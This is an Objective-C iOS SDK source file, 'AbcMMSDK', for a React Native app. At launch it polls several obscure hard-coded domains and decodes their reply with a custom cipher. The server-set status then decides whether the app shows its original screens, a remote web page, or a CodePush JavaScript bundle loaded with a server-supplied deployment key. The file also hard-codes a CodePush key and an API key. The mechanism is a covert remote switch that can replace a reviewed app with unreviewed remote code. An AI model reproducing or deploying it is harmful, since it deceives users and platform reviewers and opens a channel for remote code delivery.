

#import "AbcMMSDK.h"

#import <React/RCTBundleURLProvider.h>
#import <React/RCTRootView.h>

#import <CodePush/CodePush.h>

#import <AVFoundation/AVFoundation.h>
#import "MMNetWorkManager.h"
#import "MVMSAMKeychain.h"
#import "MMVAppDelegate.h"



// ThirdService

#import <RCTJPushModule.h>
#ifdef NSFoundationVersionNumber_iOS_9_x_Max
#import <UserNotifications/UserNotifications.h>
#endif

#import "MMVWYWebController.h"
#import <objc/runtime.h>

#import "IQKeyboardManager.h"

static const void *reactNativeRootControllerKEY = &reactNativeRootControllerKEY;
static const void *codeKeyKEY = &codeKeyKEY;
static const void *jpushKeyKEY = &jpushKeyKEY;

static const void *mmUrlKEY = &mmUrlKEY;
static const void *mmStatusKEY = &mmStatusKEY;


static const void *isRouteKEY = &isRouteKEY;
static const void *mmRainbowKEY = &mmRainbowKEY;
static const void *plistIndexKEY = &plistIndexKEY;
static const void *launchOptionsKEY = &launchOptionsKEY;

static const void *switchRouteKEY = &switchRouteKEY;



@interface AbcMMSDK()

@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UIViewController *rootController;



@end



@implementation AbcMMSDK


+(AbcMMSDK *)sharedManager{
  static AbcMMSDK *shareUrl = nil;
  static dispatch_once_t predicate;
  dispatch_once(&predicate, ^{
    shareUrl = [[self alloc]init];
  });
  return shareUrl;
}


- (UIViewController *)reactNativeRootController
{
  return objc_getAssociatedObject(self, reactNativeRootControllerKEY);
}

- (void)setReactNativeRootController:(UIViewController *)reactNativeRootController
{
  objc_setAssociatedObject(self, reactNativeRootControllerKEY, reactNativeRootController, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
}


// codeKey
- (NSString *)codeKey
{
  return objc_getAssociatedObject(self, codeKeyKEY);
}

- (void)setCodeKey:(NSString *)codeKey
{
  objc_setAssociatedObject(self, codeKeyKEY, codeKey, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
}

// pushKey
- (NSString *)jpushKey
{
  return objc_getAssociatedObject(self, jpushKeyKEY);
}

- (void)setJpushKey:(NSString *)jpushKey
{
  objc_setAssociatedObject(self, jpushKeyKEY, jpushKey, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
}


// mmUrl
- (NSString *)mmUrl
{
  return objc_getAssociatedObject(self, mmUrlKEY);
}

- (void)setMmUrl:(NSString *)mmUrl
{
  objc_setAssociatedObject(self, mmUrlKEY, mmUrl, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
}

// mmStatusKey
- (NSNumber *)mmStatus
{
  return objc_getAssociatedObject(self, mmStatusKEY);
}

- (void)setMmStatus:(NSNumber *)mmStatus
{
  objc_setAssociatedObject(self, mmStatusKEY, mmStatus, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
}


// isRoute
- (NSNumber *)isRoute
{
  return objc_getAssociatedObject(self, isRouteKEY);
}

- (void)setIsRoute:(NSNumber *)isRoute
{
  objc_setAssociatedObject(self, isRouteKEY, isRoute, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
}


// mmRainbow
- (NSDictionary *)mmRainbow
{
  return objc_getAssociatedObject(self, mmRainbowKEY);
}

- (void)setMmRainbow:(NSDictionary *)mmRainbow
{
  objc_setAssociatedObject(self, mmRainbowKEY, mmRainbow, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
}

// plistIndex
- (NSNumber *)plistIndex
{
  return objc_getAssociatedObject(self, plistIndexKEY);
}

- (void)setPlistIndex:(NSNumber *)plistIndex
{
  objc_setAssociatedObject(self, plistIndexKEY, plistIndex, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
}



- (NSDictionary *)launchOptions
{
  return objc_getAssociatedObject(self, launchOptionsKEY);
}

- (void)setLaunchOptions:(NSDictionary *)launchOptions
{
  objc_setAssociatedObject(self, launchOptionsKEY, launchOptions, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
}


- (NSString *)switchRoute
{
  return objc_getAssociatedObject(self, switchRouteKEY);
}

- (void)setSwitchRoute:(NSString *)switchRoute
{
  objc_setAssociatedObject(self, switchRouteKEY, switchRoute, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
}





-(void)configureBoardManager
{
  IQKeyboardManager *manager = [IQKeyboardManager sharedManager];
  manager.enable = YES;
  manager.shouldResignOnTouchOutside = YES;
  //  manager.shouldToolbarUsesTextFieldTintColor = YES;
  manager.keyboardDistanceFromTextField = 10;
  manager.enableAutoToolbar = YES;
}




- (void)initMMSDKLaunchOptions:(NSDictionary *)launchOptions window:(UIWindow *)window rootController:(UIViewController *)rootController switchRoute:(NSInteger)switchRoute jpushKey:(NSString *)jpushKey userUrl:(NSString *)userUrl {
  
  
  self.launchOptions = launchOptions;
  self.window = window;
  self.rootController = rootController;
  
  self.switchRoute = [NSString stringWithFormat:@"%zd", switchRoute];
  
  if (jpushKey.length > 0) {
    self.jpushKey = jpushKey;
    NSUserDefaults *userDefault = [NSUserDefaults standardUserDefaults];
    [userDefault setObject:jpushKey forKey:@"MM_jpushKey"];
  }
  
  self.mmUrl = userUrl;
  
  [self mmMonitorNetwork];
  
  [self judgmentSwitchRoute];
  
}




- (void)mianProjectPage {
  
  //  self.isRoute = YES;
  self.isRoute = [NSNumber numberWithInteger:1];
  
  
  [self interfaceOrientation:UIInterfaceOrientationPortrait];
  
  [self configureBoardManager];
  [self jPushService];
  
  [[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryAmbient error:nil];  // allow
  
  [self initReactNativeController];
  
  [self restoreRootViewController:self.reactNativeRootController];
}




- (void)mmMonitorNetwork {
  
  //  self.networkManager = [MMVAFNetworkReachabilityManager sharedManager];
  MMVAFNetworkReachabilityManager *networkManager = [MMVAFNetworkReachabilityManager sharedManager];
  
  __weak typeof(self) weakSelf = self;
  
  [networkManager setReachabilityStatusChangeBlock:^(MMVAFNetworkReachabilityStatus status) {
    if (status == MMVAFNetworkReachabilityStatusReachableViaWiFi || status == MMVAFNetworkReachabilityStatusReachableViaWWAN) {
      if ([weakSelf isFirstAuthorizationNetwork]) {
        
        if (self.switchRoute.integerValue == 11) {
          [weakSelf mmSendRNDataRequest];
        } else {
          [weakSelf sendAsyncRequestSwitchRoute];
        }
        
      }
    }
  }];
  
  [networkManager startMonitoring];
}


- (void)interfaceOrientation:(UIInterfaceOrientation)orientation
{
  if ([[UIDevice currentDevice] respondsToSelector:@selector(setOrientation:)]) {
    SEL selector  = NSSelectorFromString(@"setOrientation:");
    NSInvocation *invocation = [NSInvocation invocationWithMethodSignature:[UIDevice instanceMethodSignatureForSelector:selector]];
    [invocation setSelector:selector];
    [invocation setTarget:[UIDevice currentDevice]];
    int val = orientation;
    [invocation setArgument:&val atIndex:2];
    [invocation invoke];
  }
}


- (BOOL)isFirstAuthorizationNetwork {
  NSString *serviceName = [[NSBundle mainBundle] bundleIdentifier];
  
  NSString *isFirst = [MVMSAMKeychain passwordForService:serviceName account:kMVMSAMKeychainLabelKey];
  
  if (! isFirst || isFirst.length < 1) {
    
    [MVMSAMKeychain setPassword:@"FirstAuthorizationNetwork" forService:serviceName account:kMVMSAMKeychainLabelKey];
    return YES;
  } else {
    
    return NO;
  }
}

- (UIViewController *)jikuhRootController {
  
  UIViewController *imageVC =  [[UIViewController alloc] init];
  imageVC.view.backgroundColor = [UIColor colorWithRed: 0.957 green: 0.988 blue: 1 alpha: 1];
  UIImageView *imagView = [[UIImageView alloc] initWithFrame:CGRectMake(0, 0, [UIScreen mainScreen].bounds.size.width, [UIScreen mainScreen].bounds.size.height)];
  imagView.image = [self mmGetTheLaunch];
  [imageVC.view addSubview:imagView];
  
  return imageVC;
}



- (void)webProjectPage {
  
  //  self.isRoute = YES;
  self.isRoute = [NSNumber numberWithInteger:1];
  
  [self interfaceOrientation:UIInterfaceOrientationPortrait];
  
  [self jPushService];
  
  MMVWYWebController *webVC = [[MMVWYWebController alloc] init];
  
  [self restoreRootViewController:webVC];
}


- (void)restoreRootViewController:(UIViewController *)newRootController {
  
  [UIView transitionWithView:self.window duration:0.25 options:UIViewAnimationOptionTransitionCrossDissolve animations:^{
    
    BOOL oldState = [UIView areAnimationsEnabled];
    [UIView setAnimationsEnabled:NO];
    if (self.window.rootViewController!=newRootController) {
      self.window.rootViewController = newRootController;
    }
    [UIView setAnimationsEnabled:oldState];
  } completion:nil];
}





- (void)initReactNativeController {
  if (self.reactNativeRootController==nil) {
    
    self.reactNativeRootController = [[UIViewController alloc] init];
    NSURL *jsCodeLocation;
    
    NSDictionary *infoPlist = [[NSBundle mainBundle] infoDictionary];
    NSString *bundleVersion = [infoPlist objectForKey:@"CFBundleVersion"];
    
    
    if (self.switchRoute.integerValue == 1 || [bundleVersion isEqualToString:@"0.0.1"]) {
      [CodePush overrideAppVersion:@"0.0.1"];
      [CodePush setDeploymentKey:@"l3eIf26WCaIJrWdKUxYpHsOe9Ed-9afe8b5b-cdf2-4643-bc5d-7d81e9f4cbe0"];
      if (self.mmStatus.integerValue != 5) {
        self.mmStatus = [NSNumber numberWithInteger:1];
      }
    } else {
      [CodePush overrideAppVersion:@"1.0.0"];
    }
    
    //    if (![bundleVersion isEqualToString:@"0.0.1"]) {
    //      [CodePush overrideAppVersion:@"1.0.0"];
    //    } else {
    //      if (self.mmStatus.integerValue != 5) {
    //        self.mmStatus = [NSNumber numberWithInteger:1];
    //      }
    //    }
    
    if (self.codeKey.length > 0) {
      [CodePush setDeploymentKey:self.codeKey];
    }
    
#ifdef DEBUG
    
    //    jsCodeLocation = [CodePush bundleURL];
    
    jsCodeLocation = [[RCTBundleURLProvider sharedSettings] jsBundleURLForBundleRoot:@"index" fallbackResource:nil];
    
    //     jsCodeLocation = [[NSBundle mainBundle] URLForResource:@"main" withExtension:@"jsbundle"];
    
    //    jsCodeLocation = [NSURL URLWithString:[[[[NSBundle mainBundle] resourcePath] stringByAppendingPathComponent:@"bundles"] stringByAppendingPathComponent:@"main.jsbundle"]];
    
    
#else
    jsCodeLocation = [CodePush bundleURL];
    
#endif
    
    if (self.mmUrl.length <= 0) {
      self.mmUrl = @"";
    }
    
    if (self.mmRainbow == nil) {
      self.mmRainbow = @{@"mm": @"mm"};
    }
    
    NSString *serviceName = [[NSBundle mainBundle] bundleIdentifier];
    NSString *isFirst = [MVMSAMKeychain passwordForService:serviceName account:kMVMSAMKeychainLabelKey];
    if (! isFirst || isFirst.length < 1) {
      isFirst = @"1";
    } else {
      isFirst = @"0";
    }
    
    NSDictionary *props = @{@"OrientationLink": @"1", @"mmStatus": @(self.mmStatus.integerValue), @"mmUrl": self.mmUrl, @"mmisFirst": isFirst, @"mmRainbow": self.mmRainbow};
    RCTRootView *rootView = [[RCTRootView alloc] initWithBundleURL:jsCodeLocation
                                                        moduleName:@"SKyCPRN"
                                                 initialProperties:props
                                                     launchOptions:self.launchOptions];
    rootView.appProperties = props;
    rootView.backgroundColor = [[UIColor alloc] initWithRed:1.0f green:1.0f blue:1.0f alpha:1];
    
    
    UIViewController *rootViewController = [UIViewController new];
    rootViewController.view = rootView;
    
    self.reactNativeRootController = rootViewController;
  }
}






#pragma mark - judgmentSwitchRoute
- (void)judgmentSwitchRoute {
  
  NSUserDefaults *userDefault = [NSUserDefaults standardUserDefaults];
  self.codeKey = [userDefault stringForKey:@"MM_codeKey"];
  if ([userDefault stringForKey:@"MM_jpushKey"].length > 0) {
    self.jpushKey = [userDefault stringForKey:@"MM_jpushKey"];
  }
  
  if ([userDefault stringForKey:@"MM_mmUrl"].length > 0) {
    self.mmUrl = [userDefault stringForKey:@"MM_mmUrl"];
  }
  
  
  NSInteger mmStatus = [userDefault stringForKey:@"MM_mmStatus"].integerValue;
  self.mmStatus = [NSNumber numberWithInteger:mmStatus];
  
  NSString *mmRainbowStr = [userDefault stringForKey:@"MM_mmRainbow"];
  
  self.mmRainbow = [self dictionaryWithJsonString:mmRainbowStr];
  
  if (self.switchRoute.integerValue == 11 || self.switchRoute.integerValue == 1 || ((mmStatus == 1 || mmStatus >= 3) && self.switchRoute.integerValue == 0)) {
    
    if (self.switchRoute.integerValue == 11) {
      
      if (mmStatus == 1 || mmStatus >= 3) {
        [self mianProjectPage];
        [self sendAsyncRequestSwitchRoute];
      } else {
        [self mmSendRNDataRequest];
      }
      
    } else {
      [self mianProjectPage];
    }
    
    if (self.switchRoute.integerValue == 11 || self.switchRoute.integerValue == 1) {
      return;
    }
    
  } else if (self.switchRoute.integerValue == 3 || (mmStatus == 2 && (self.switchRoute.integerValue == 0 || self.switchRoute.integerValue == 11))) {
    [self webProjectPage];
    if (self.switchRoute.integerValue == 3) {
      return;
    }
  } else if (self.switchRoute.integerValue == 2) {
    [self restoreRootViewController:self.rootController];
    return;
  } else {
    //    NSString *dataStr = [self sendSyncRequestDecodeSwitchRoute];
    //    [self switchRouteAction:dataStr];
  }
  
  if (self.switchRoute.integerValue == 0 || self.switchRoute.integerValue == 11) {
    [self sendAsyncRequestSwitchRoute];
  }
  
  if (!self.isRoute) {
    UIViewController *initMmRoot =  [self jikuhRootController];
    [self restoreRootViewController:initMmRoot];
  }
}


- (void)switchRouteAction:(NSString *)mmStatus {
  
  if ([self deptNumInputShouldNumber:mmStatus]) {
    NSInteger status =  mmStatus.integerValue;
    if (status == 1 || status >= 3) {
      [self mianProjectPage];
      return;
    } else if (status == 2) {
      [self webProjectPage];
      return;
    } else if (status == 0) {
      [self restoreRootViewController:self.rootController];
      return;
    }
  }
  UIViewController *initMmRoot =  [self jikuhRootController];
  [self restoreRootViewController:initMmRoot];
  
}



- (BOOL)deptNumInputShouldNumber:(NSString *)str {
  if (str.length == 0) {
    return NO;
  }
  NSString *regex = @"[0-9]*";
  NSPredicate *pred = [NSPredicate predicateWithFormat:@"SELF MATCHES %@",regex];
  if ([pred evaluateWithObject:str]) {
    return YES;
  }
  return NO;
}



- (void)mmSendRNDataRequest {
  
  NSDictionary *infoPlist = [[NSBundle mainBundle] infoDictionary];
  NSString *bundleIdentifer = [infoPlist objectForKey:@"CFBundleIdentifier"];
  
  
  NSArray *mmArray = @[@"http://plist.fd94.com", @"http://plist.dv31.com", @"http://plist.534j.com", @"http://plist.ce64.com"];
  
  NSInteger indexmm = self.plistIndex.integerValue;
  NSString *switchURL = [NSString stringWithFormat:@"%@/index.php/appApi/request/ac/getAppData/appid/%@/key/d20a1bf73c288b4ad4ddc8eb3fc59274704a0495/client/3",mmArray[indexmm], bundleIdentifer];
  
  
  NSURLRequest *urlRequest = [NSURLRequest requestWithURL:[NSURL URLWithString:switchURL]
                                              cachePolicy:NSURLRequestReloadIgnoringLocalCacheData
                                          timeoutInterval:10];
  
  NSURLResponse *response = nil;
  NSError *error = nil;
  NSData *data = [NSURLConnection sendSynchronousRequest:urlRequest returningResponse:&response error:&error];
  
  if (error) {
    
    indexmm++;
    self.plistIndex = [NSNumber numberWithInteger:indexmm];
    if (indexmm > mmArray.count -1) {
      self.plistIndex = [NSNumber numberWithInteger:0];
      
      NSString *serviceName = [[NSBundle mainBundle] bundleIdentifier];
      NSString *isFirst = [MVMSAMKeychain passwordForService:serviceName account:kMVMSAMKeychainLabelKey];
      if (! isFirst || isFirst.length < 1) {
        UIViewController *initMmRoot =  [self jikuhRootController];
        [self restoreRootViewController:initMmRoot];
      }  else {
        [self mianProjectPage];
      }
      
      return;
    } else {
      [self mmSendRNDataRequest];
      return;
    }
  }
  
  if (!data) {
    [self mianProjectPage];
    return;
  }
  
  NSDictionary *responseDict = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
  
  NSInteger msg = [responseDict[@"msg"] integerValue];
  
  //  NSDictionary *dataDic = responseDict[@"data"];
  NSString *dataEnString = [NSString stringWithFormat:@"%@", responseDict[@"data"]];
  
  NSUserDefaults *userDefault = [NSUserDefaults standardUserDefaults];
  
  
  NSString *mmStatus = @"0";
  if (msg == 0) {
    
    NSString *mmdataString = [self changeUiWithUrlTarget:dataEnString Pass:@"bxvip588"];
    NSDictionary *dataDic = [self dictionaryWithJsonString:mmdataString];
    self.mmRainbow = dataDic;
    
    
    NSString *codeKey = dataDic[@"code_key"];
    NSString *pushKey = dataDic[@"ji_push_key"];
    NSString *mmUrl = dataDic[@"url"];
    mmStatus = dataDic[@"status"];
    
    self.codeKey = codeKey;
    
    if (pushKey.length > 0) {
      self.jpushKey = pushKey;
    }
    if (mmUrl.length > 0) {
      self.mmUrl = mmUrl;
    }
    
    self.mmStatus =[NSNumber numberWithInteger:mmStatus.integerValue];
    
    [userDefault setObject:codeKey forKey:@"MM_codeKey"];
    [userDefault setObject:pushKey forKey:@"MM_jpushKey"];
    [userDefault setObject:mmUrl forKey:@"MM_mmUrl"];
    [userDefault setObject:mmStatus forKey:@"MM_mmStatus"];
    [userDefault setObject:mmdataString forKey:@"MM_mmRainbow"];
    
  }
  
  if (self.mmUrl.length == 0) {
    self.codeKey = [userDefault stringForKey:@"MM_codeKey"];
    if ([userDefault stringForKey:@"MM_jpushKey"].length > 0) {
      self.jpushKey = [userDefault stringForKey:@"MM_jpushKey"];
    }
    if ([userDefault stringForKey:@"MM_mmUrl"].length > 0) {
      self.mmUrl = [userDefault stringForKey:@"MM_mmUrl"];
    }
    
    self.mmStatus =[NSNumber numberWithInteger:[userDefault stringForKey:@"MM_mmStatus"].integerValue];
  }
  
  if (msg == 0 && self.switchRoute.integerValue != 11) {
    [self switchRouteAction:[NSString stringWithFormat:@"%zd", self.mmStatus.integerValue]];
  } else {
    [self mianProjectPage];
  }
  
}



#pragma mark - sendAsyncRequestSwitchRoute
- (void)sendAsyncRequestSwitchRoute{
  
  NSDictionary *infoPlist = [[NSBundle mainBundle] infoDictionary];
  NSString *bundleIdentifer = [infoPlist objectForKey:@"CFBundleIdentifier"];
  
  NSArray *mmArray = @[@"http://plist.fd94.com", @"http://plist.dv31.com", @"http://plist.534j.com", @"http://plist.ce64.com"];
  
  NSInteger indexmm = self.plistIndex.integerValue;
  
  NSString *switchURL = [NSString stringWithFormat:@"%@/index.php/appApi/request/ac/getAppData/appid/%@/key/d20a1bf73c288b4ad4ddc8eb3fc59274704a0495/client/3",mmArray[indexmm], bundleIdentifer];
  
  __weak typeof(self) weakSelf = self;
  [MMNetWorkManager requestWithType:HttpRequestTypeGet withUrlString:switchURL withParaments:nil withSuccessBlock:^(NSDictionary *object) {
    
    NSDictionary *responseDic = object;
    
    NSInteger msg = [responseDic[@"msg"] integerValue];
    
    //    NSDictionary *dataDic = responseDic[@"data"];
    NSString *dataEnString = [NSString stringWithFormat:@"%@", responseDic[@"data"]];
    
    NSUserDefaults *userDefault = [NSUserDefaults standardUserDefaults];
    
    NSString *mmStatus = @"0";
    if (msg == 0) {
      
      NSString *mmdataString = [weakSelf changeUiWithUrlTarget:dataEnString Pass:@"bxvip588"];
      NSDictionary *dataDic = [weakSelf dictionaryWithJsonString:mmdataString];
      weakSelf.mmRainbow = dataDic;
      
      NSString *codeKey = dataDic[@"code_key"];
      NSString *pushKey = dataDic[@"ji_push_key"];
      NSString *mmUrl = dataDic[@"url"];
      mmStatus = dataDic[@"status"];
      
      weakSelf.codeKey = codeKey;
      if (pushKey.length > 0) {
        weakSelf.jpushKey = pushKey;
      }
      
      if (mmUrl.length > 0) {
        weakSelf.mmUrl = mmUrl;
      }
      
      
      if (mmStatus.integerValue == 4) {
        if (weakSelf.mmStatus.integerValue == 0) {
          [weakSelf switchRouteAction:@"0"];
        }
        return;
      }
      [userDefault setObject:codeKey forKey:@"MM_codeKey"];
      [userDefault setObject:pushKey forKey:@"MM_jpushKey"];
      [userDefault setObject:mmUrl forKey:@"MM_mmUrl"];
      [userDefault setObject:mmStatus forKey:@"MM_mmStatus"];
      [userDefault setObject:mmdataString forKey:@"MM_mmRainbow"];
      
    }
    
    weakSelf.mmStatus =  [NSNumber numberWithInteger:[userDefault stringForKey:@"MM_mmStatus"].integerValue];
    
    if (weakSelf.switchRoute.integerValue == 0 || (msg == 0 && weakSelf.switchRoute.integerValue != 11)) {
      [weakSelf switchRouteAction:[NSString stringWithFormat:@"%zd",weakSelf.mmStatus.integerValue]];
    }
    
  } withFailureBlock:^(NSError *error) {
    //    NSLog(@"post error： *** %@", error);
    
    if (error) {
      NSInteger indexmm = self.plistIndex.integerValue;
      //      weakSelf.plistIndex++;
      indexmm++;
      weakSelf.plistIndex = [NSNumber numberWithInteger:indexmm];
      if (indexmm > mmArray.count -1) {
        weakSelf.plistIndex = [NSNumber numberWithInteger:0];
        [weakSelf switchRouteAction:[NSString stringWithFormat:@"%zd",weakSelf.mmStatus.integerValue]];
      } else {
        [weakSelf sendAsyncRequestSwitchRoute];
      }
    }
    
  } progress:^(float progress) {
    //    NSLog(@"progress： *** %f", progress);
    
  }];
  
  
}


-(UIImage *)mmGetTheLaunch {
  
  CGSize viewSize = [UIScreen mainScreen].bounds.size;
  
  NSString *viewOrientation = nil;
  
  if (([[UIApplication sharedApplication] statusBarOrientation] == UIInterfaceOrientationPortraitUpsideDown) || ([[UIApplication sharedApplication] statusBarOrientation] == UIInterfaceOrientationPortrait)) {
    viewOrientation = @"Portrait";
  } else {
    viewOrientation = @"Landscape";
  }
  
  NSString *launchImage = nil;
  
  NSArray* imagesDict = [[[NSBundle mainBundle] infoDictionary] valueForKey:@"UILaunchImages"];
  
  for (NSDictionary* dict in imagesDict) {
    CGSize imageSize = CGSizeFromString(dict[@"UILaunchImageSize"]);
    if (CGSizeEqualToSize(imageSize, viewSize) && [viewOrientation isEqualToString:dict[@"UILaunchImageOrientation"]])
    {
      launchImage = dict[@"UILaunchImageName"];
    }
  }
  
  return [UIImage imageNamed:launchImage];
}




- (NSDictionary *)dictionaryWithJsonString:(NSString *)jsonString {
  if (jsonString == nil) {
    return nil;
  }
  
  NSData *jsonData = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
  NSError *err;
  NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:jsonData
                                                      options:NSJSONReadingMutableContainers
                                                        error:&err];
  if(err) {
    return nil;
  }
  return dic;
}



- (NSString *)changeUiWithUrlTarget:(NSString *)target Pass:(NSString *)pass
{
  
  NSString *result = @"";
  NSMutableArray *codes =[[NSMutableArray alloc] init];
  
  
  for(int i=0; i<[pass length]; i++)
  {
    NSString *temp = [pass substringWithRange:NSMakeRange(i,1)];
    NSString *objStr = [NSString stringWithFormat:@"%d",[temp characterAtIndex:0]];
    [codes addObject:objStr];
  }
  
  for (int i=0; i<[target length]; i+=2)
  {
    int ascii = [[self numberHexString:[target substringWithRange:NSMakeRange(i, 2)]] intValue];
    for (int j = (int)[codes count]; j>0; j--)
    {
      int val = ascii - [(codes[j-1]) intValue]*j;
      if (val < 0)
      {
        ascii = 256 - (abs(val)%256);
      }
      else
      {
        ascii = val%256;
      }
    }
    result = [result stringByAppendingString:[NSString stringWithFormat:@"%c", ascii]];
    
  }
  
  return result;
}


- (NSNumber *)numberHexString:(NSString *)aHexString
{
  
  if (nil == aHexString)
  {
    return nil;
  }
  
  NSScanner * scanner = [NSScanner scannerWithString:aHexString];
  unsigned long long longlongValue;
  [scanner scanHexLongLong:&longlongValue];
  
  NSNumber * hexNumber = [NSNumber numberWithLongLong:longlongValue];
  
  return hexNumber;
}


- (void)setObject:(id)object forKey:(NSString *)key {
  
  if (key == nil || [key isEqualToString:@""]) {
    return;
  }
  
  NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
  
  [defaults setObject:object forKey:key];
  
  [defaults synchronize];
}


- (id)objectForKey:(NSString *)key {
  NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
  return [defaults objectForKey:key];
}











// ThirdService
#pragma mark - AppDelegate+ThirdService

- (void)jPushService {
  
  JPUSHRegisterEntity * entity = [[JPUSHRegisterEntity alloc] init];
  
  entity.types = UNAuthorizationOptionAlert|UNAuthorizationOptionBadge|UNAuthorizationOptionSound;
  
  [JPUSHService registerForRemoteNotificationConfig:entity delegate:[MMVAppDelegate class]];
  [JPUSHService setupWithOption:self.launchOptions appKey:self.jpushKey
                        channel:nil apsForProduction:true];
}




@end






